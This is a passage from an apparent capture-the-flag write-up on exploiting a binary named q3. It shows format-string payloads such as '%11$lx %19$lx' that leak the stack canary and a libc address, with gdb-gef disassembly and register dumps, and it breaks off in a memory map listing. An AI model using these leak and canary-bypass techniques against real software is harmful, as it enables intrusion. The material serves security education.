number">8341</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8343</span><span class="token number">12</span> AAAA <span class="token number">555555554830</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8343</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8345</span><span class="token number">13</span> AAAA 7ffff7a05b97<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8345</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8347</span><span class="token number">14</span> AAAA <span class="token number">1</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8347</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8349</span><span class="token number">15</span> AAAA 7fffffffde88<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8349</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8351</span><span class="token number">16</span> AAAA <span class="token number">100008000</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8351</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8353</span><span class="token number">17</span> AAAA 55555555477a<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8353</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8355</span><span class="token number">18</span> AAAA <span class="token number">0</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8355</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">8357</span><span class="token number">19</span> AAAA 8f241916698aca1f                                     <span class="token operator">&lt;-</span><span class="token operator">-</span><span class="token operator">-</span> This is of interest<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">8357</span><span class="token punctuation">)</span></code></pre><p>So, the addresses starting from <code>0x7f</code> are libc addresses and we have offset for our input at 8 but what are those at offset 11 and 19? Whatever it is, this is something we might need. Upon discussing this from a guy(super helpful) named Faith, he told me that it <strong>could be</strong> stack canary address. Now, if we didn’t had a format string vulnerability then we had to bruteforce the value,luckily enough we have that vulnerability here.</p><p>To be more broad:-<br>I’ll be using gdb-gef as we have to inspect some of the registers, et’s break the <code>__main__</code> function:-</p><pre class=" language-r"><code class="language-r">gef➤  disas mainDump of assembler code <span class="token keyword">for</span> <span class="token keyword">function</span> main<span class="token operator">:</span>   <span class="token number">0x000000000000077a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span><span class="token operator">:</span>    push   rbp   <span class="token number">0x000000000000077b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span><span class="token operator">:</span>    mov    rbp<span class="token punctuation">,</span>rsp   <span class="token number">0x000000000000077e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token operator">:</span>    sub    rsp<span class="token punctuation">,</span><span class="token number">0x30</span>   <span class="token number">0x0000000000000782</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span><span class="token operator">:</span>    mov    rax<span class="token punctuation">,</span>QWORD PTR fs<span class="token operator">:</span><span class="token number">0x28</span>   <span class="token number">0x000000000000078b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">17</span><span class="token operator">></span><span class="token operator">:</span>    mov    QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>rax   <span class="token number">0x000000000000078f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">21</span><span class="token operator">></span><span class="token operator">:</span>    xor    eax<span class="token punctuation">,</span>eax   <span class="token number">0x0000000000000791</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">23</span><span class="token operator">></span><span class="token operator">:</span>    mov    QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x0</span>   <span class="token number">0x0000000000000799</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">31</span><span class="token operator">></span><span class="token operator">:</span>    mov    QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x0</span>   <span class="token number">0x00000000000007a1</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">39</span><span class="token operator">></span><span class="token operator">:</span>    mov    rax<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x200868</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 0x201010 &lt;stdin@@GLIBC_2.2.5></span>   <span class="token number">0x00000000000007a8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">46</span><span class="token operator">></span><span class="token operator">:</span>    mov    QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x28</span><span class="token punctuation">]</span><span class="token punctuation">,</span>rax   <span class="token number">0x00000000000007ac</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">50</span><span class="token operator">></span><span class="token operator">:</span>    lea    rdi<span class="token punctuation">,</span><span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0x101</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 0x8b4</span>   <span class="token number">0x00000000000007b3</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">57</span><span class="token operator">></span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span><span class="token number">0x0</span>   <span class="token number">0x00000000000007b8</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">62</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x640</span> <span class="token operator">&lt;</span>printf<span class="token operator">@</span>plt<span class="token operator">></span>   <span class="token number">0x00000000000007bd</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">67</span><span class="token operator">></span><span class="token operator">:</span>    mov    rdx<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x28</span><span class="token punctuation">]</span>   <span class="token number">0x00000000000007c1</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">71</span><span class="token operator">></span><span class="token operator">:</span>    lea    rax<span class="token punctuation">,</span><span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">]</span>   <span class="token number">0x00000000000007c5</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">75</span><span class="token operator">></span><span class="token operator">:</span>    mov    esi<span class="token punctuation">,</span><span class="token number">0x10</span>   <span class="token number">0x00000000000007ca</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">80</span><span class="token operator">></span><span class="token operator">:</span>    mov    rdi<span class="token punctuation">,</span>rax   <span class="token number">0x00000000000007cd</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">83</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x650</span> <span class="token operator">&lt;</span>fgets<span class="token operator">@</span>plt<span class="token operator">></span>   <span class="token number">0x00000000000007d2</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">88</span><span class="token operator">></span><span class="token operator">:</span>    lea    rdi<span class="token punctuation">,</span><span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0xe9</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 0x8c2</span>   <span class="token number">0x00000000000007d9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">95</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x620</span> <span class="token operator">&lt;</span>puts<span class="token operator">@</span>plt<span class="token operator">></span>   <span class="token number">0x00000000000007de</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">100</span><span class="token operator">></span><span class="token operator">:</span>    lea    rax<span class="token punctuation">,</span><span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">]</span>   <span class="token number">0x00000000000007e2</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">104</span><span class="token operator">></span><span class="token operator">:</span>    mov    rdi<span class="token punctuation">,</span>rax   <span class="token number">0x00000000000007e5</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">107</span><span class="token operator">></span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span><span class="token number">0x0</span>   <span class="token number">0x00000000000007ea</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">112</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x640</span> <span class="token operator">&lt;</span>printf<span class="token operator">@</span>plt<span class="token operator">></span>   <span class="token number">0x00000000000007ef</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">117</span><span class="token operator">></span><span class="token operator">:</span>    lea    rdi<span class="token punctuation">,</span><span class="token punctuation">[</span>rip<span class="token operator">+</span><span class="token number">0xd2</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 0x8c8</span>   <span class="token number">0x00000000000007f6</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">124</span><span class="token operator">></span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span><span class="token number">0x0</span>   <span class="token number">0x00000000000007fb</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">129</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x640</span> <span class="token operator">&lt;</span>printf<span class="token operator">@</span>plt<span class="token operator">></span>   <span class="token number">0x0000000000000800</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">134</span><span class="token operator">></span><span class="token operator">:</span>    mov    rdx<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x28</span><span class="token punctuation">]</span>   <span class="token number">0x0000000000000804</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">138</span><span class="token operator">></span><span class="token operator">:</span>    lea    rax<span class="token punctuation">,</span><span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">]</span>   <span class="token number">0x0000000000000808</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">142</span><span class="token operator">></span><span class="token operator">:</span>    mov    esi<span class="token punctuation">,</span><span class="token number">0x100</span>   <span class="token number">0x000000000000080d</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">147</span><span class="token operator">></span><span class="token operator">:</span>    mov    rdi<span class="token punctuation">,</span>rax   <span class="token number">0x0000000000000810</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">150</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x650</span> <span class="token operator">&lt;</span>fgets<span class="token operator">@</span>plt<span class="token operator">></span>   <span class="token number">0x0000000000000815</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">155</span><span class="token operator">></span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span><span class="token number">0x0</span>   <span class="token number">0x000000000000081a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">160</span><span class="token operator">></span><span class="token operator">:</span>    mov    rcx<span class="token punctuation">,</span>QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">]</span>   <span class="token number">0x000000000000081e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">164</span><span class="token operator">></span><span class="token operator">:</span>    xor    rcx<span class="token punctuation">,</span>QWORD PTR fs<span class="token operator">:</span><span class="token number">0x28</span>   <span class="token operator">&lt;-</span> This line checks whether the provided canary is equal to the one calculated before   <span class="token number">0x0000000000000827</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">173</span><span class="token operator">></span><span class="token operator">:</span>    je     <span class="token number">0x82e</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">180</span><span class="token operator">></span>   <span class="token number">0x0000000000000829</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">175</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x630</span> <span class="token operator">&lt;</span>__stack_chk_fail<span class="token operator">@</span>plt<span class="token operator">></span>   <span class="token number">0x000000000000082e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">180</span><span class="token operator">></span><span class="token operator">:</span>    leave     <span class="token number">0x000000000000082f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">181</span><span class="token operator">></span><span class="token operator">:</span>    ret    End of assembler dump.</code></pre><p>Let’s try to check those two offsets 11 and 19 to see if it’s the stack canary or not:-</p><p>At first, we need to setup a breakpoint at the instruction where the comaprison happens i.e. <code>main+164</code> and we will just give random input at second and analyse the registers.</p><pre class=" language-r"><code class="language-r">gef➤  b <span class="token operator">*</span>main<span class="token operator">+</span><span class="token number">164</span>Breakpoint <span class="token number">1</span> at <span class="token number">0x81e</span>gef➤  rStarting program<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>robin<span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">/</span>q3 Enter name <span class="token operator">:</span> %<span class="token number">11</span><span class="token operator">$</span>lx %<span class="token number">19</span><span class="token operator">$</span>lx Hello50a01b0663fa1e00 ebd42dea12670b41Enter sentence <span class="token operator">:</span> AAAA<span class="token punctuation">[</span> Legend<span class="token operator">:</span> Modified register <span class="token operator">|</span> Code <span class="token operator">|</span> Heap <span class="token operator">|</span> Stack <span class="token operator">|</span> String <span class="token punctuation">]</span>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────<span class="token operator">$</span>rax   <span class="token operator">:</span> <span class="token number">0x0</span>               <span class="token operator">$</span>rbx   <span class="token operator">:</span> <span class="token number">0x0</span>               <span class="token operator">$</span>rcx   <span class="token operator">:</span> <span class="token number">0x50a01b0663fa1e00</span><span class="token operator">$</span>rdx   <span class="token operator">:</span> <span class="token number">0x00007ffff7dd18d0</span>  →  <span class="token number">0x0000000000000000</span><span class="token operator">$</span>rsp   <span class="token operator">:</span> <span class="token number">0x00007fffffffdd10</span>  →  <span class="token number">0x00007ffff7de59a0</span>  →  <span class="token operator">&lt;</span>_dl_fini<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> push rbp<span class="token operator">$</span>rbp   <span class="token operator">:</span> <span class="token number">0x00007fffffffdd40</span>  →  <span class="token number">0x0000555555554830</span>  →  <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> push r15<span class="token operator">$</span>rsi   <span class="token operator">:</span> <span class="token number">0x00007fffffffdd20</span>  →  <span class="token number">0x2520000a41414141</span> <span class="token punctuation">(</span><span class="token string">"AAAA"</span>?<span class="token punctuation">)</span><span class="token operator">$</span>rdi   <span class="token operator">:</span> <span class="token number">0x00007fffffffdd21</span>  →  <span class="token number">0x312520000a414141</span> <span class="token punctuation">(</span><span class="token string">"AAA"</span>?<span class="token punctuation">)</span><span class="token operator">$</span>rip   <span class="token operator">:</span> <span class="token number">0x000055555555481e</span>  →  <span class="token number">0x000028250c334864</span> <span class="token punctuation">(</span>"dH3                                                        %<span class="token punctuation">(</span>"?<span class="token punctuation">)</span><span class="token operator">$</span>r8    <span class="token operator">:</span> <span class="token number">0x0000555555756675</span>  →  <span class="token string">"x %19$lx"</span><span class="token operator">$</span>r9    <span class="token operator">:</span> <span class="token number">0x00007ffff7fd24c0</span>  →  <span class="token number">0x00007ffff7fd24c0</span>  →  <span class="token punctuation">[</span>loop detected<span class="token punctuation">]</span><span class="token operator">$</span>r10   <span class="token operator">:</span> <span class="token number">0x00007ffff7fd24c0</span>  →  <span class="token number">0x00007ffff7fd24c0</span>  →  <span class="token punctuation">[</span>loop detected<span class="token punctuation">]</span><span class="token operator">$</span>r11   <span class="token operator">:</span> <span class="token number">0x246</span>             <span class="token operator">$</span>r12   <span class="token operator">:</span> <span class="token number">0x0000555555554670</span>  →  <span class="token operator">&lt;</span>_start<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> xor ebp<span class="token punctuation">,</span> ebp<span class="token operator">$</span>r13   <span class="token operator">:</span> <span class="token number">0x00007fffffffde20</span>  →  <span class="token number">0x0000000000000001</span><span class="token operator">$</span>r14   <span class="token operator">:</span> <span class="token number">0x0</span>               <span class="token operator">$</span>r15   <span class="token operator">:</span> <span class="token number">0x0</span>               <span class="token operator">$</span>eflags<span class="token operator">:</span> <span class="token punctuation">[</span>ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification<span class="token punctuation">]</span><span class="token operator">$</span>cs<span class="token operator">:</span> <span class="token number">0x0033</span> <span class="token operator">$</span>ss<span class="token operator">:</span> <span class="token number">0x002b</span> <span class="token operator">$</span>ds<span class="token operator">:</span> <span class="token number">0x0000</span> <span class="token operator">$</span>es<span class="token operator">:</span> <span class="token number">0x0000</span> <span class="token operator">$</span>fs<span class="token operator">:</span> <span class="token number">0x0000</span> <span class="token operator">$</span>gs<span class="token operator">:</span> <span class="token number">0x0000</span> ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────<span class="token number">0x00007fffffffdd10</span>│<span class="token operator">+</span><span class="token number">0x0000</span><span class="token operator">:</span> <span class="token number">0x00007ffff7de59a0</span>  →  <span class="token operator">&lt;</span>_dl_fini<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> push rbp     ← <span class="token operator">$</span>rsp<span class="token number">0x00007fffffffdd18</span>│<span class="token operator">+</span><span class="token number">0x0008</span><span class="token operator">:</span> <span class="token number">0x00007ffff7dcfa00</span>  →  <span class="token number">0x00000000fbad2288</span><span class="token number">0x00007fffffffdd20</span>│<span class="token operator">+</span><span class="token number">0x0010</span><span class="token operator">:</span> <span class="token number">0x2520000a41414141</span> <span class="token punctuation">(</span><span class="token string">"AAAA"</span>?<span class="token punctuation">)</span>     ← <span class="token operator">$</span>rsi<span class="token number">0x00007fffffffdd28</span>│<span class="token operator">+</span><span class="token number">0x0018</span><span class="token operator">:</span> <span class="token number">0x00000a786c243931</span> <span class="token punctuation">(</span><span class="token string">"19$lx"</span>?<span class="token punctuation">)</span><span class="token number">0x00007fffffffdd30</span>│<span class="token operator">+</span><span class="token number">0x0020</span><span class="token operator">:</span> <span class="token number">0x00007fffffffde20</span>  →  <span class="token number">0x0000000000000001</span><span class="token number">0x00007fffffffdd38</span>│<span class="token operator">+</span><span class="token number">0x0028</span><span class="token operator">:</span> <span class="token number">0x50a01b0663fa1e00</span><span class="token number">0x00007fffffffdd40</span>│<span class="token operator">+</span><span class="token number">0x0030</span><span class="token operator">:</span> <span class="token number">0x0000555555554830</span>  →  <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> push r15     ← <span class="token operator">$</span>rbp<span class="token number">0x00007fffffffdd48</span>│<span class="token operator">+</span><span class="token number">0x0038</span><span class="token operator">:</span> <span class="token number">0x00007ffff7a05b97</span>  →  <span class="token operator">&lt;</span>__libc_start_main<span class="token operator">+</span><span class="token number">231</span><span class="token operator">></span> mov edi<span class="token punctuation">,</span> eax──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code<span class="token operator">:</span>x86<span class="token operator">:</span><span class="token number">64</span> ────   <span class="token number">0x555555554810</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">150</span><span class="token operator">></span>       call   <span class="token number">0x555555554650</span> <span class="token operator">&lt;</span>fgets<span class="token operator">@</span>plt<span class="token operator">></span>   <span class="token number">0x555555554815</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">155</span><span class="token operator">></span>       mov    eax<span class="token punctuation">,</span> <span class="token number">0x0</span>   <span class="token number">0x55555555481a</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">160</span><span class="token operator">></span>       mov    rcx<span class="token punctuation">,</span> QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">]</span> → <span class="token number">0x55555555481e</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">164</span><span class="token operator">></span>       xor    rcx<span class="token punctuation">,</span> QWORD PTR fs<span class="token operator">:</span><span class="token number">0x28</span>   <span class="token number">0x555555554827</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">173</span><span class="token operator">></span>       je     <span class="token number">0x55555555482e</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">180</span><span class="token operator">></span>   <span class="token number">0x555555554829</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">175</span><span class="token operator">></span>       call   <span class="token number">0x555555554630</span> <span class="token operator">&lt;</span>__stack_chk_fail<span class="token operator">@</span>plt<span class="token operator">></span>   <span class="token number">0x55555555482e</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">180</span><span class="token operator">></span>       leave     <span class="token number">0x55555555482f</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">181</span><span class="token operator">></span>       ret       <span class="token number">0x555555554830</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> push   r15──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────<span class="token punctuation">[</span><span class="token comment" spellcheck="true">#0] Id 1, Name: "q3", stopped, reason: BREAKPOINT</span>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────<span class="token punctuation">[</span><span class="token comment" spellcheck="true">#0] 0x55555555481e → main()</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Breakpoint <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x000055555555481e</span> <span class="token keyword">in</span> main <span class="token punctuation">(</span><span class="token punctuation">)</span>gef➤  p <span class="token operator">$</span>rcx<span class="token operator">$</span><span class="token number">1</span> <span class="token operator">=</span> <span class="token number">0x50a01b0663fa1e00</span>    <span class="token operator">&lt;-</span><span class="token operator">-</span> Ye<span class="token punctuation">,</span> there it is.gef➤  </code></pre><p>Here, we have a stack canary leak which is equal to the one in <code>rcx</code> register where it’s getting stored. So, now we need to find out the libc offset as we are now on buffer overflow stage. As we already know we need to get libc offset and from earlier that format string vulnerability was causing the libc address to leak, so it’d be a matter of time to find it out:-</p><pre class=" language-r"><code class="language-r">gef➤  rStarting program<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>robin<span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">/</span>q3 Enter name <span class="token operator">:</span> %<span class="token number">3</span><span class="token operator">$</span>lxHello7ffff7af4154Enter sentence <span class="token operator">:</span> <span class="token operator">^</span>C  Program received signal SIGINT<span class="token punctuation">,</span> Interrupt.<span class="token operator">-</span><span class="token operator">-</span> snip <span class="token operator">-</span><span class="token operator">-</span>gef➤  vmmapStart              End                Offset             Perm Path<span class="token number">0x0000555555554000</span> <span class="token number">0x0000555555555000</span> <span class="token number">0x0000000000000000</span> r<span class="token operator">-</span>x <span class="token operator">/</span>home<span class="token operator">/</span>robin<span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">/</span>q3<span class="token number">0x0000555555754000</span> <span class="token number">0x0000555555755000</span> <span class="token number">0x0000000000000000</span> r<span class="token operator">-</span><span class="token operator">-</span> <span class="token operator">/</span>home<span class="token operator">/</span>robin<span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">/</span>q3<span class="token number">0x0000555555755000</span> <span class="token number">0x0000555555756000</span> <span class="token number">0x0000000000001000</span> rw<span class="token operator">-</span> <span class="token operator">/</span>home<span class="token operator">/</span>robin<span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">/</span>q3<span class="token number">0x0000555555756000</span> <span class="token number">0x0000555555777000</span> <span class="token number">0x0000000000000000</span> rw<span class="token operator">-</span> <span class="token punctuation">[</span>heap<span class="token punctuation">]</span><span class="token number">0x00007ffff79e4000</span> <span class="token number">0x00007ffff7bcb000</span> <span class="token number">0x0000000000000000</span> r<span class="token operator">-</span>x <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span>.so<span class="token number">0x00007ffff7bcb000</span> <span class="token number">0x00007ffff7dcb000</span> <span class="token number">0x00000000001e7000</span> <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span>.so<span class="token number">0x00007ffff7dcb000</span> <span class="token number">0x00007ffff7dcf000</span> <span class="token number">0x00000000001e7000</span> r<span class="token operator">-</span><span class="token operator">-</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span>.so<span class="token number">0x00007ffff7dcf000</span> <span class="token number">0x00007ffff7dd1000</span> <span class="token number">0x00000000001eb000</span> rw<span class="token operator">-</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token operator">-</span><span class="token number">2.27</span>.so<span class="token number">0x00007ffff7dd1000</span> <span class="token number">0x00007ffff7dd5000</span> <span class="token number">0x0000000000000000</span> rw<span class="token operator">-</span> <span class="token number">0x00007ffff7dd5000</span> <span class="token number">0x00007ffff7dfc000</span> <span class="token number">0x0000000000000000</span> r<span class="token operator">-</span>x <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span>.so<span class="token number">0x00007ffff7fd1000</span> <span class="token number">0x00007ffff7fd3000</span> <span class="token number">0x0000000000000000</span> rw<span class="token operator">-</span> <span class="token number">0x00007ffff7ff7000</span> <span class="token number">0x00007ffff7ffa000</span> <span class="token number">0x0000000000000000</span> r<span class="token operator">-</span><span class="token operator">-</span> <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span><span class="token number">0x00007ffff7ffa000</span> <span class="token number">0x00007ffff7ffc000</span> <span class="token number">0x0000000000000000</span> r<span class="token operator">-</span>x <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span><span class="token number">0x00007ffff7ffc000</span> <span class="token number">0x00007ffff7ffd000</span> <span class="token number">0x0000000000027000</span> r<span class="token operator">-</span><span class="token operator">-</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span>.so<span class="token number">0x00007ffff7ffd000</span> <span class="token number">0x00007ffff7ffe000</span> <span class="token number">0x0000000000028000</span> rw<span class="token operator">-</span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>ld<span class="token operator">-</span><span class="token number">2.27</span>.so<span class="token number">0x00007ffff7ffe000</span> <span class="token number">0x00007ffff7fff000</span> <span class="token number">0x0000000000000000</span> rw<span class="token operator">-</span> <span class="token number">0x00007ffffffde000</span> <span class="token number">0x00007ffffffff000</span> <span class="token number">0x0000000000000000</span> rw<span class="token operator">-</span> <span class="token punctuation">[</span>stack<span class="token punctuation">]</span><span class="token number">0xffffffffff600000</span> <span class="token number">0xffffffffff601000</span> <span class="token number">0x0000000000000000</span> r<span class="token operator">-</span>x <span class="token punctuation">[</span>vsyscall<span class="token 